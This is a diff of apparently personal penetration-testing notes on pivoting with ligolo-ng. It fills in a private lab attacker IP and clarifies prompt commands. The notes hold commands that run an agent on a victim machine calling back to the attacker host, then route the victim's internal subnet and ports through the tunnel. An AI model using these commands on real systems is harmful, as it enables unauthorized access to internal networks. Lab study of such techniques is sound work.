@@ -514,7 +514,7 @@ sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:4443 
 
 # On the victim machine run the command
-./agent -connect <attacker IP here>:4443 -ignore-cert
+./agent -connect 192.168.45.242:4443 -ignore-cert
 ./agent -connect 192.168.45.184:4443 -ignore-cert
 
 # On attacker machine run below on ligolo-ng promt
@@ -526,12 +526,12 @@ ifconfig (to identify the subnet)
 sudo ip route add <subnet identified for pivoting> dev ligolo
 sudo ip route add 192.168.184.0/24 dev ligolo
 ip route list
-start
+start <- on the ligolo-ng promt
 
 # On attacker machine run the command for port forwarding (all ports)
 sudo ip route add 240.0.0.1/32 dev ligolo
 ip route list
-start
+start <- on the ligolo-ng promt
 
 Now browse the ports on http://240.0.0.1:PORT
 
